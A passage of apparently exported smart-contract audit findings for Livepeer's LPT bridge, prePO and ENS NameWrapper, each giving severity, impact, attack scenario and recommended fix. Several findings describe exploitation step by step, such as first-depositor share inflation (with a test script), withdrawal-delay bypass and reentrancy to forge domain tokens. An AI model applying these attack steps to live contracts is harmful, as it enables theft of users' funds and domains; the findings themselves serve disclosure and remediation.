    bytes memory gatewayData = GatewayMessageHandler.encodeFromRouterToGateway(
        msg.sender,
        _data
    );

    emit TransferRouted(_token, msg.sender, _to, gateway);
    return
        ITokenGateway(gateway).outboundTransfer{ value: msg.value }(
            _token,
            _to,
            _amount,
            _maxGas,
            _gasPriceBid,
            gatewayData
        );
}
```

However, `L2LPTGateway` dose not implement `outboundTransfer(address,address,uint256,uint256,uint256,bytes)` but only `outboundTransfer(address,address,uint256,bytes)`:

<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2LPTGateway.sol#L65-L89>

```solidity
function outboundTransfer(
    address _l1Token,
    address _to,
    uint256 _amount,
    bytes calldata _data
) public override whenNotPaused returns (bytes memory res) {
    // ...
}
```

Therefore, the desired feature to withdraw LPT from L2 to L1 via Arbitrum Router will not be working properly.

#### Recommendation

Consider implementing the method used by  Arbitrum Router.

See also the implementation of L2DaiGateway by arbitrum-dai-bridge: <https://github.com/makerdao/arbitrum-dai-bridge/blob/master/contracts/l2/L2DaiGateway.sol#L88-L95>"
73.md,Admin can rug L2 Escrow tokens leading to reputation risk,medium,".

The `L1Escrow` contract has the function `approve` that is callable by the admin to approve an arbitrary spender with an arbitrary amount (so they can steal all of the escrow's holdings if they want). Even if the admin is well intended, the contract can still be called out which would degrade the reputation of the protocol (e.g. see here: <https://twitter.com/RugDocIO/status/1411732108029181960>). LPT is valuable on the Ethereum mainnet, so this rug vector should be mitigated. It would be best to restrict this function's power by only allowing approvals to other trusted protocol contracts (like L1LPTGateway, which I believe uses the escrow's approval).

NOTE: Even if the admin is under a timelock, this is still an issue, as users have to wait a whole week to withdraw from L2 -> L1 due to the dispute period.

#### Proof of Concept

See the `approve` function [here](https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/escrow/L1Escrow.sol#L21)

#### Recommended Mitigation Steps

Restrict the power of this `approve` function so that the admin isn't able to steal funds. This can be accomplished by only allowing approvals to other protocol functions (instead of arbitrary approvals)."
100.md,Strategy Migration May Leave Tokens in the Old Strategy Impacting Share Calculations,high,"If a strategy does not have sufficient funds to `withdraw()` for the full amount then it is possible that tokens will be left in this yield contract during `migrate()`.

It is common for withdrawal from a strategy to withdraw less than a user's balance. The reason is that these yield protocols may lend the deposited funds to borrowers, if there is less funds in the pool than the withdrawal amount the withdrawal may succeed but only transfer the funds available rather than the full withdrawal amount.

The impact of tokens remaining in the old strategy is that when we call `StrategyController.totalValue()` this will only account for the tokens deposited in the new strategy and not those stuck in the previous strategy. Therefore `totalValue()` is undervalued.

Thus, when a user calls `Collateral.deposit()` the share calculations `_shares = (_amountToDeposit * totalSupply()) / (_valueBefore);` will be over stated (note: `uint256 _valueBefore = _strategyController.totalValue();`). Hence, the user will receive more shares than they should.

The old tokens may be recovered by calling `migrate()` back to the old strategy. If this is done then `totalValue()` will now include the tokens previously stuck. The recent depositer may now withdraw and will be owed `(_strategyController.totalValue() * _amount) / totalSupply()`. Since `totalValue()` is now includes the previously stuck tokens  `_owed` will be overstated and the user will receive more collateral than they should.

The remaining users who had deposited before `migrate()` will lose tokens proportional to their share of the `totalSupply()`.

### Proof of Concept

[SingleStrategyController.sol#L51-L72](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/SingleStrategyController.sol#L51-L72)<br>

        function migrate(IStrategy _newStrategy)
            external
            override
            onlyOwner
            nonReentrant
        {
            uint256 _oldStrategyBalance;
            IStrategy _oldStrategy = _strategy;
            _strategy = _newStrategy;
            _baseToken.approve(address(_newStrategy), type(uint256).max);
            if (address(_oldStrategy) != address(0)) {
                _baseToken.approve(address(_oldStrategy), 0);
                _oldStrategyBalance = _oldStrategy.totalValue();
                _oldStrategy.withdraw(address(this), _oldStrategyBalance);
                _newStrategy.deposit(_baseToken.balanceOf(address(this)));
            }
            emit StrategyMigrated(
                address(_oldStrategy),
                address(_newStrategy),
                _oldStrategyBalance
            );
        }

### Recommended Mitigation Steps

The recommendation is to ensure that `require(_oldStrategy.totalValue() == 0)` after calling `_oldStrategy.withdraw()`. This ensures that no funds are left in the strategy. Consider the code example below.

        function migrate(IStrategy _newStrategy)
            external
            override
            onlyOwner
            nonReentrant
        {
            uint256 _oldStrategyBalance;
            IStrategy _oldStrategy = _strategy;
            _strategy = _newStrategy;
            _baseToken.approve(address(_newStrategy), type(uint256).max);
            if (address(_oldStrategy) != address(0)) {
                _baseToken.approve(address(_oldStrategy), 0);
                _oldStrategyBalance = _oldStrategy.totalValue();
                _oldStrategy.withdraw(address(this), _oldStrategyBalance);
                require(_oldStrategy.totalValue() == 0)
                _newStrategy.deposit(_baseToken.balanceOf(address(this)));
            }
            emit StrategyMigrated(
                address(_oldStrategy),
                address(_newStrategy),
                _oldStrategyBalance
            );
        }





***"
100.md,First depositor can break minting of shares,high,"[Collateral.sol#L82-L91](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L82-L91)<br>

The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719\_ToB_yearn_vaultsv2/ToB\_-\_Yearn_Vault_v\_2\_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.

### Proof of Concept

*   Attacker deposits 2 wei (so that it is greater than min fee) to mint 1 share
*   Attacker transfers exorbitant amount to `_strategyController` to greatly inflate the share’s price. Note that the `_strategyController` deposits its entire balance to the strategy when its `deposit()` function is called.
*   Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.

```jsx
it(""will cause 0 share issuance"", async () => {
	// 1. first user deposits 2 wei because 1 wei will be deducted for fee
	let firstDepositAmount = ethers.BigNumber.from(2)
	await transferAndApproveForDeposit(
	    user,
	    collateral.address,
	    firstDepositAmount
	)
	
	await collateral
	    .connect(user)
	    .deposit(firstDepositAmount)
	
	// 2. do huge transfer of 1M to strategy to controller
	// to greatly inflate share price
	await baseToken.transfer(strategyController.address, ethers.utils.parseEther(""1000000""));
	
	// 3. deployer tries to deposit reasonable amount of 10_000
	let subsequentDepositAmount = ethers.utils.parseEther(""10000"");
	await transferAndApproveForDeposit(
	    deployer,
	    collateral.address,
	    subsequentDepositAmount
	)

	await collateral
	    .connect(deployer)
	    .deposit(subsequentDepositAmount)
	
	// receives 0 shares in return
	expect(await collateral.balanceOf(deployer.address)).to.be.eq(0)
});
```

### Recommended Mitigation Steps

*   [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.
*   Ensure the number of shares to be minted is non-zero: `require(_shares != 0, ""zero shares minted"");`
*   Create a periphery contract that contains a wrapper function that atomically calls `initialize()` and `deposit()`
*   Call `deposit()` once in `initialize()` to achieve the same effect as the suggestion above.





***"
100.md,Withdrawal delay can be circumvented,high,"[Collateral.sol#L97](https://github.com/code-423n4/2022-03-prepo/blob/f63584133a0329781609e3f14c3004c1ca293e71/contracts/core/Collateral.sol#L97)<br>

After initiating a withdrawal with `initiateWithdrawal`, it's still possible to transfer the collateral tokens.
This can be used to create a second account, transfer the accounts to them and initiate withdrawals at a different time frame such that one of the accounts is always in a valid withdrawal window, no matter what time it is.
If the token owner now wants to withdraw they just transfer the funds to the account that is currently in a valid withdrawal window.

Also, note that each account can withdraw the specified `amount`. Creating several accounts and circling & initiating withdrawals with all of them allows withdrawing larger amounts **even at the same block** as they are purchased in the future.

I consider this high severity because it breaks core functionality of the Collateral token.

### Proof of Concept

For example, assume the `_delayedWithdrawalExpiry = 20` blocks. Account A owns 1000 collateral tokens, they create a second account B.

*   At `block=0`, A calls `initiateWithdrawal(1000)`. They send their balance to account B.
*   At `block=10`, B calls `initiateWithdrawal(1000)`. They send their balance to account A.
*   They repeat these steps, alternating the withdrawal initiation every 10 blocks.
*   One of the accounts is always in a valid withdrawal window (`initiationBlock < block && block <= initiationBlock + 20`). They can withdraw their funds at any time.

### Recommended Mitigation Steps

If there's a withdrawal request for the token owner (`_accountToWithdrawalRequest[owner].blockNumber > 0`), disable their transfers for the time.

```solidity
// pseudo-code not tested
beforeTransfer(from, to, amount) {
  super();
  uint256 withdrawalStart =  _accountToWithdrawalRequest[from].blockNumber;
  if(withdrawalStart > 0 && withdrawalStart + _delayedWithdrawalExpiry < block.number) {
    revert(); // still in withdrawal window
  }
}
```





***"
100.md,Duplicate  `_tokenNameSuffix` and `_tokenSymbolSuffix` will incorrectly update current Market,medium,"[PrePOMarketFactory.sol#L42](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarketFactory.sol#L42)<br>

Impacted Function: `createMarket`.

1.  Owner calls createMarket with  \_tokenNameSuffix S1 and \_tokenSymbolSuffix S2 which creates a new market M1 with \_deployedMarkets\[\_salt] pointing to M1. Here salt can be S which is computed using  \_tokenNameSuffix and \_tokenSymbolSuffix
2.  This market is now being used
3.  After some time owner again mistakenly calls createMarket with  \_tokenNameSuffix S1 and \_tokenSymbolSuffix S2
4.  Instead of returning error mentioning that this name and symbol already exists, new market gets created. The problem here is that salt which is computed using \_tokenNameSuffix and \_tokenSymbolSuffix will again come as S (as in step 1) which means \_deployedMarkets\[\_salt] will now get updated to M2. This means reference to M1 is gone

### Recommended Mitigation Steps

Add below check:

    require(_deployedMarkets[_salt]==address(0), ""Market already exists"");





***"
100.md,Market expiry behaviour differs in implementation and documentation,medium,"[prePO Docs: Expiry](https://docs.prepo.io/concepts/markets#expiry)<br>
[PrePOMarket.sol#L145-L156](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L145-L156)<br>

The docs say that “If a market has not settled by its expiry date, it will automatically settle at the lower bound of its Valuation Range.”

However, in the implementation, the expiry date is entirely ignored. The default settlement after expiry is a 1:1 ratio of long and short token for 1 collateral token.

### Impact

Should users believe that the market will settle at the lower bound, they would swap and hold long for short tokens instead of at a 1:1 ratio upon expiry. Thereafter, they would incur swap fees from having to swap some short tokens back for long tokens for redemption. User funds are also  affected should long tokens are repurchased at a higher price than when they were sold.

### Recommended Mitigation Steps

If the market is to settle at the lower valuation after expiry, then the following logic should be added:

```jsx
// market has expired
// settle at lower bound
if (block.timestamp > _expiryTime) {
	uint256 _shortPrice = MAX_PRICE - _floorLongPrice;
	_collateralOwed =
		(_floorLongPrice * _longAmount + _shortPrice * _shortAmount) /
		MAX_PRICE;
} else if (_finalLongPrice <= MAX_PRICE) {
	...
} else {
	...
}
```

Otherwise, the documentation should be updated to reflect the default behaviour of 1:1 redemption.







***"
100.md,`getSharesForAmount` returns wrong value when `totalAssets == 0`,medium,"The [`getSharesForAmount`](https://github.com/code-423n4/2022-03-prepo/blob/f63584133a0329781609e3f14c3004c1ca293e71/contracts/core/Collateral.sol#L328) function returns `0` if `totalAssets == 0`.

However, if **`totalSupply == 0`**, the actual shares that are minted in a [`deposit` are `_amount`](https://github.com/code-423n4/2022-03-prepo/blob/f63584133a0329781609e3f14c3004c1ca293e71/contracts/core/Collateral.sol#L83) even if `totalAssets == 0`.

Contracts / frontends that use this function to estimate their deposit when `totalSupply == 0` will return a wrong value.

### Recommended Mitigation Steps

```diff
function getSharesForAmount(uint256 _amount)
    external
    view
    override
    returns (uint256)
{
+   // to match the code in `deposit`
+   if (totalSupply() == 0) return _amount;

    uint256 _totalAssets = totalAssets();
    return
        (_totalAssets > 0)
            ? ((_amount * totalSupply()) / _totalAssets)
            : 0; // @audit this should be _amount according to `deposit`
}
```





***"
100.md,SingleStrategyController doesn't verify that new strategy uses the same base token,medium,"When migrating from one strategy to another, the controller pulls out the funds of the old strategy and deposits them into the new one. But, it doesn't verify that both strategies use the same base token. If the new one uses a different base token, it won't ""know"" about the tokens it received on migration. It won't be able to deposit and transfer them. Effectively they would be lost.

The migration is done by the owner. So the owner must make a mistake and migrate to the wrong strategy by accident. In a basic protocol with 1 controller and a single active strategy managing that should be straightforward. There shouldn't be a real risk of that mistake happening. But, if you have multiple controllers running at the same time each with a different base token, it gets increasingly likelier.

According to the `IStrategy` interface, there is a function to retrieve the strategy's base token: `getBaseToken()`. I'd recommend adding a check in the `migrate()` function to verify that the new strategy uses the correct base token to prevent this issue from being possible.

### Proof of Concept

[SingleStrategyController.sol#L51-L72](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/SingleStrategyController.sol#L51-L72)<br>

[IStrategy.sol#L52](https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/interfaces/IStrategy.sol#L52)<br>

### Recommended Mitigation Steps

Add  `require(_baseToken == _newStrategy.getBaseToken());` to the beginning of `migrate()`.





***"
100.md,Wrong formula of `getSharesForAmount()` can potentially cause fund loss when being used to calculate the `shares` to be used in `withdraw()`,medium,"In `Collateral`, the getter functions `getAmountForShares()` and `getSharesForAmount()` is using `totalAssets()` instead of `_strategyController.totalValue()`, making the results can be different than the actual shares amount needed to `withdraw()` a certain amount of `_baseToken` and the amount of shares expected to get by `deposit()` a certain amount.

Specifically, `totalAssets()` includes the extra amount of `_baseToken.balanceOf(Collateral)`.

[Collateral.sol#L306-L329](https://github.com/code-423n4/2022-03-prepo/blob/f63584133a0329781609e3f14c3004c1ca293e71/contracts/core/Collateral.sol#L306-L329)<br>

```solidity
function getAmountForShares(uint256 _shares)
    external
    view
    override
    returns (uint256)
{
    if (totalSupply() == 0) {
        return _shares;
    }
    return (_shares * totalAssets()) / totalSupply();
}

function getSharesForAmount(uint256 _amount)
    external
    view
    override
    returns (uint256)
{
    uint256 _totalAssets = totalAssets();
    return
        (_totalAssets > 0)
            ? ((_amount * totalSupply()) / _totalAssets)
            : 0;
}
```

[Collateral.sol#L339-L343](https://github.com/code-423n4/2022-03-prepo/blob/f63584133a0329781609e3f14c3004c1ca293e71/contracts/core/Collateral.sol#L339-L343)<br>

```solidity
function totalAssets() public view override returns (uint256) {
    return
        _baseToken.balanceOf(address(this)) +
        _strategyController.totalValue();
}
```

[Collateral.sol#L137-L148](https://github.com/code-423n4/2022-03-prepo/blob/f63584133a0329781609e3f14c3004c1ca293e71/contracts/core/Collateral.sol#L137-L148)<br>

```solidity
function withdraw(uint256 _amount)
    external
    override
    nonReentrant
    returns (uint256)
{
    require(_withdrawalsAllowed, ""Withdrawals not allowed"");
    if (_delayedWithdrawalExpiry != 0) {
        _processDelayedWithdrawal(msg.sender, _amount);
    }
    uint256 _owed = (_strategyController.totalValue() * _amount) /
        totalSupply();
    ...
```

### Proof of Concept

Given:

*   `_baseToken.balanceOf(Collateral)` == 90
*   `_strategyController.totalValue()` == 110
*   totalSupply of shares = 100

`totalAssets()` returns: 200

`getSharesForAmount(100)` returns: 50, while `withdraw(50)` will actual only get: 55.

When `Collateral` is used by another contract that manages many users' funds, and if it's using `getSharesForAmount()` to calculate the amount of shares needed for a certain amount of underlying tokens to be withdrawn.

This issue can potentially cause fund loss to the user of that contract because it will actually send a lesser amount of `_baseToken` than expected.

### Recommended Mitigation Steps

Consider changing `Collateral.totalValue()` to:

```solidity
function totalAssets() public view override returns (uint256) {
    return
        _strategyController.totalValue();
}
```





***"
145.md,"It is possible to create fake ERC1155 `NameWrapper` token for subdomain, which is not owned by `NameWrapper`",high,"*Submitted by panprog, also found by Aussie\_Battlers, brgltd, cryptphi, peritoflores, and wastewa*

[NameWrapper.sol#L820-L821](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L820-L821)<br>
[NameWrapper.sol#L524](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L524)<br>
[NameWrapper.sol#L572](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L572)<br>

Due to re-entrancy possibility in `NameWrapper._transferAndBurnFuses` (called from `setSubnodeOwner` and `setSubnodeRecord`), it is possible to do some stuff in `onERC1155Received` right after transfer but before new owner and new fuses are set. This makes it possible, for example, to unwrap the subdomain, but owner and fuses will still be set even for unwrapped domain, creating fake `ERC1155` `NameWrapper` token for domain, which is not owned by `NameWrapper`.

Fake token creation scenario:

1.  `Account1` registers and wraps `test.eth` domain
2.  `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` subdomain with `Account1` as owner (to make NameWrapper owner of subdomain)
3.  `Contract1` smart contract is created, which calls unwrap in its `onERC1155Received` function, and a function to send `sub.test.eth` ERC1155 NameWrapper token back to `Account1`
4.  `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` with `Contract1` as new owner, which unwraps domain back to `Account1` but due to re-entrancy, NameWrapper sets fuses and ownership to `Contract1`
5.  `Account1` calls function to send ERC1155 token from `Contract1` back to self.

After this sequence of events, `sub.test.eth` subdomain is owned by `Account1` both in `ENS` registry and in `NameWrapper` (with fuses and expiry correctly set to the future date). Lots (but not all) of functions in `NameWrapper` will fail to execute for this subdomain, because they expect `NameWrapper` to have ownership of the domain in `ENS`, but some functions will still work, making it possible to make the impression of good domain.

At this point, ownership in `NameWrapper` is ""detached"" from ownership in `ENS` and `Account1` can do all kinds of malcious stuff with its ERC1155 token. For example:

1.  Sell subdomain to the other user, transfering `ERC1155` to that user and burning `PARENT_CANNOT_CONTROL` to create impression that he can't control the domain. After receiving the payment, `Account1` can wrap the domain again, which burns existing ownership record and replaces with the new one with clear fuses and `Account1` ownership, effectively stealing domain back from unsuspecting user, who thought that `ERC1155` gives him the right to the domain (and didn't expect that parent can clear fuses when `PARENT_CANNOT_CONTROL` is set).

2.  Transfer subdomain to some other smart contract, which implements `onERC1155Received`, then take it back, fooling smart contract into believing that it has received the domain.

### Proof of Concept

Copy these to test/wrapper and run:<br>
yarn test test/wrapper/NameWrapperReentrancy.js

<https://gist.github.com/panprog/3cd94e3fbb0c52410a4c6609e55b863e>

### Recommended Mitigation Steps

Consider adding `nonReentrant` modifiers with `ReentrancyGuard` implementation from `openzeppelin`. Alternatively just fix this individual re-entrancy issue. There are multiple ways to fix it depending on expected behaviour, for example saving `ERC1155` data and requiring it to match the data after transfer (restricting `onERC1155Received` to not change any data for the token received):

    function _transferAndBurnFuses(
        bytes32 node,
        address newOwner,
        uint32 fuses,
        uint64 expiry
    ) internal {
        (address owner, uint32 saveFuses, uint64 saveExpiry) = getData(uint256(node));
        _transfer(owner, newOwner, uint256(node), 1, """");
        uint32 curFuses;
        uint64 curExpiry;
        (owner, curFuses, curExpiry) = getData(uint256(node));
        require(owner == newOwner && saveFuses == curFuses && saveExpiry == curExpiry);
        _setFuses(node, newOwner, fuses, expiry);
    }





***"
145.md,"The expiry of the parent node can be smaller than the one of a child node, violating the guarantee policy",high,"*Submitted by PwnedNoMore*

[NameWrapper.sol#L504](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L504)<br>
[NameWrapper.sol#L356](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356)<br>

By design, the child node's expiry can only be extended up to the parent's current one. Adding these restrictions means that the ENS users only have to look at the name itself's fuses and expiry (without traversing the hierarchy) to understand what guarantees the users have.

When a parent node tries to `setSubnodeOwner` / `setSubnodeRecord`, the following code is used to guarantee that the new expiry can only be extended up to the current one.

```solidity
function _getDataAndNormaliseExpiry(
    bytes32 parentNode,
    bytes32 node,
    uint64 expiry
)
    internal
    view
    returns (
        address owner,
        uint32 fuses,
        uint64
    )
{
    uint64 oldExpiry;
    (owner, fuses, oldExpiry) = getData(uint256(node));
    (, , uint64 maxExpiry) = getData(uint256(parentNode));
    expiry = _normaliseExpiry(expiry, oldExpiry, maxExpiry);
    return (owner, fuses, expiry);
}
```

However, the problem shows when

*   The sub-domain (e.g., `sub1.base.eth`) has its own sub-sub-domain (e.g., `sub2.sub1.base.eth`)
*   The sub-domain is unwrapped later, and thus its `oldExpiry` becomes zero.
*   When `base.eth` calls `NameWrapper.setSubnodeOwner`, there is not constraint of `sub1.base.eth`'s expiry, since `oldExpiry == 0`. As a result, the new expiry of `sub1.base.eth` can be arbitrary and smaller than the one of `sub2.sub1.base.eth`

The point here is that the `oldExpiry` will be set as 0 when unwrapping the node even it holds child nodes, relaxing the constraint.

Specifically, considering the following scenario

*   The hacker owns a domain (or a 2LD), e.g., `base.eth`
*   The hacker assigns a sub-domain to himself, e.g., `sub1.base.eth`
    *   The expiry should be as large as possible
*   Hacker assigns a sub-sub-domain, e.g., `sub2.sub1.base.eth`
    *   The expiry should be as large as possible
*   The hacker unwraps his sub-domain, i.e., `sub1.base.eth`
*   The hacker re-wraps his sub-domain via `NameWrapper.setSubnodeOwner`
    *   The expiry can be small than the one of sub2.sub1.base.eth

The root cause *seems* that we should not zero out the expiry when burning a node if the node holds any subnode.

### Suggested Fix

*   Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped.
*   Potential fix 2: force the parent to have `CANNOT_UNWRAP` burnt if they want to set expiries on a child via `setSubnodeOwner` / `setSubnodeRecord` / `setChildFuses`

### Proof of Concept / Attack Scenario

For full details, please see [original warden submission](https://github.com/code-423n4/2022-07-ens-findings/issues/187).





***"
145.md,`PARENT_CANNOT_CONTROL` can be bypassed by maliciously unwrapping parent node,high,"*Submitted by PwnedNoMore, also found by panprog, and zzzitron*

[NameWrapper.sol#L356](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356)<br>
[NameWrapper.sol#L295](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L295)<br>
[ENSRegistry.sol#L74](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/registry/ENSRegistry.sol#L74)<br>

By design, for any subdomain, as long as its `PARENT_CANNOT_CONTROL` fuse is burnt (and does not expire), its parent should not be able to burn its fuses or change its owner.

However, this contraint can be bypassed by a parent node maliciously unwrapping itself. As long as the hacker becomes the ENS owner of the parent node, he can leverage `ENSRegistry::setSubnodeOwner` to re-set himself as the ENS owner of the subdomain, and thus re-invoking `NameWrapper.wrap` can rewrite the fuses and wrapper owner of the given subdoamin.

Considering the following attack scenario:

*   Someone owns a domain (or a 2LD), e.g., *poc.eth*
*   The domain owner assigns a sub-domain to the hacker, e.g., *hack.poc.eth*
    *   This sub-domain should not burn `CANNOT_UNWRAP`
    *   This sub-domain can burn `PARENT_CANNOT_CONTROL`
*   Hacker assigns a sub-sub-domain to a victim user, e.g., *victim.hack.poc.eth*
*   The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`
    *   The hacker should not be able to change the owner and the fuses of `victim.hack.poc.eth` ideally
*   However, the hacker then unwraps his sub-domain, i.e., *hack.poc.eth*
*   The hacker invokes `ENSRegistry::setSubnodeOwner(hacker.poc.eth, victim)` on the sub-sub-domain
    *   He can reassign himself as the owner of the *victim.hack.poc.eth*
*   The hacker invokes `NameWrapper.wrap(victim.hacker.poc.eth)` to over-write the fuses and owner of the sub-sub-domain, i.e., *victim.hacker.poc.eth*

The root cause here is that, for any node, when one of its subdomains burns `PARENT_CANNOT_CONTROL`, the node itself fails to burn `CANNOT_UNWRAP`. Theoretically, this should check to the root, which however is very gas-consuming.

### Suggested Fix

*   Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped.
*   Potential fix 2: leave fuses as is when unwrapping and re-wrapping, unless name expires. Meanwhile, check the old fuses even wrapping.

### Proof of Concept / Attack Scenario

For full details, please see [original warden submission](https://github.com/code-423n4/2022-07-ens-findings/issues/173).





***"
145.md,`wrapETH2LD` permissioning is over-extended,medium,"*Submitted by 0x52*

Undesired use of ENS wrapper.

### Proof of Concept

[NameWrapper.sol#L219-L223](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L219-L223)<br>

Current permissioning for wrapETH2LD allows msg.senders who are not owner to call it if they are EITHER approved for all on the ERC721 registrar or approved on the wrapper. Allowing users who are approved for the ERC721 registrar makes sense. By giving them approval, you are giving them approval to do what they wish with the token. Any other restrictions are moot regardless because they could use approval to transfer themselves the token anyways and bypass them as the new owner. The issue is allowing users who are approved for the wrapper contract to wrap the underlying domain. By giving approval to the contract the user should only be giving approval for the wrapped domains. As it is currently setup, once a user has given approval on the wrapper contract they have essentially given approval for every domain, wrapped or unwrapped, because any unwrapped domain can be wrapped and taken control of. This is an over-extension of approval which should be limited to the tokens managed by the wrapper contract and not extend to unwrapped domains

### Recommended Mitigation Steps

Remove L221.





***"
145.md,Renew of 2nd level domain is not done properly,medium,"*Submitted by csanuragjain, also found by cccz and GimelSec*

[ETHRegistrarController.sol#L201](https://github.com/code-423n4/2022-07-ens/blob/main/contracts/ethregistrar/ETHRegistrarController.sol#L201)<br>
[NameWrapper.sol#L271](https://github.com/ensdomains/ens-contracts/blob/master/contracts/wrapper/NameWrapper.sol#L271)<br>

The ETHRegistrarController is calling renew from base registrar and not through Namewrapper. This means the fuses for the subdomain will not be updated via [\_setData](https://github.com/code-423n4/2022-07-ens/blob/main/contracts/wrapper/NameWrapper.sol#L284). This impacts the permission model set over subdomain and could lead to takeover

### Proof of Concept

1.  Observe the [renew](https://github.com/code-423n4/2022-07-ens/blob/main/contracts/ethregistrar/ETHRegistrarController.sol#L189) function

<!---->

    function renew(string calldata name, uint256 duration)
            external
            payable
            override
        {
            ...

            uint256 expires = base.renew(uint256(label), duration);

            ....
        }

2.  As we can see this is calling renew function of Base Registrar instead of NameWrapper. Since this is not going via NameWrapper fuses will not be set

3.  Also since renew in NameWrapper can only be called via Controller which is ETHRegistrarController so there is no way to renew subdomain

### Recommended Mitigation Steps

The ETHRegistrarController must renew using Namewrapper's renew contract.





***"
145.md,`transfer()` depends on gas consts,medium,"*Submitted by rajatbeladiya, also found by \_\_141345\_\_, \_Adam, 0x29A, 0xNineDec, alan724, Amithuddar, asutorufos, Aussie\_Battlers, berndartmueller, c3phas, cccz, Ch\_301, cryptphi, csanuragjain, Dravee, durianSausage, fatherOfBlocks, GimelSec, hake, hyh, IllIllI, Jujic, Limbooo, pashov, RedOneN, Ruhum, scaraven, TomJ, and zzzitron*

[ETHRegistrarController.sol#L183-L185](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L183-L185)<br>
[ETHRegistrarController.sol#L204](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L204)<br>

`transfer()` forwards 2300 gas only, which may not be enough in future if the recipient is a contract and gas costs change. it could break existing contracts functionality.

### Proof of Concept

`.transfer` or `.send` method, only 2300 gas will be “forwarded” to fallback function. Specifically, the SLOAD instruction, will go from costing 200 gas to 800 gas.

If any smart contract has a functionality of register ens and it has fallback function which is making some state change in contract on ether receive, it could use more than 2300 gas and revert every transaction.

For reference, check out:
* <https://docs.soliditylang.org/en/v0.8.15/security-considerations.html?highlight=transfer#sending-and-receiving-ether>
* <https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/>

### Recommended Mitigation Steps

Use `.call` insted `.transfer`

     (bool success, ) = msg.sender.call.value(amount)("""");
     require(success, ""Transfer failed."");








***"
145.md,`BytesUtil.compare` returns wrong result on some strings longer than 32 characters,medium,"*Submitted by panprog, also found by alan724 and GimelSec*

[BytesUtils.sol#L66-L70](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/dnssec-oracle/BytesUtils.sol#L66-L70)<br>

Due to incorrect condition in `ByteUtil.compare` function, irrelevant characters are masked out only for strings shorter than `32` characters. However, they must be masked out for strings of all lengths in the last pass of the loop (when remainder of the string is 32 characters or less). This leads to incorrect comparision of strings longer than `32` characters where `len` or `otherlen` is smaller than string length (characters beyond provided length are still accounted for in the comparision in this case while they should be ignored).

This wrong `compare` behaviour also makes `RRUtils.compareNames` fail to correctly compare DNS names in certain cases.

While the `BytesUtil.compare` and `RRUtils.compareNames` methods are currently not used in the functions in the scope (but are used in mainnet's `DNSSECImpl.checkNsecName`, which is out of scope here), they're public library functions relied upon and can be used by the other users or the ENS project in the future. And since the functions in scope provide incorrect result, that's a wrong (unexpected) behaviour of the smart contract. Moreover, since the problem can be seen only with the large strings (more than `32` characters), this might go unnoticed with any code that uses `compare` or `compareNames` method and can potentially lead to high security risk of any integration project or ENS itself.

Example strings to compare which give incorrect result:
`01234567890123450123456789012345ab`
`01234567890123450123456789012345aa`

Each string is `34` characters long, first `33` characters are the same, the last one is different. If we compare first `33` characters of both strings, the result should be `equal` (as they only differ in the 34th character), but `compare` will return `>`, because it fails to ignore the last character of both strings and simply compares strings themselves.

If we compare the first `33` characters from the first string vs all `34` characters of the second string, the result of `compare` will be `>`, while the correct result is `<`, because `compare` fails to ignore the last character of the first string.

Example dns names to compare which give incorrect result:<br>
`01234567890123456789012345678901a0.0123456789012345678901234567890123456789012345678.eth`<br>
`01234567890123456789012345678901a.0123456789012345678901234567890123456789012345678.eth`<br>

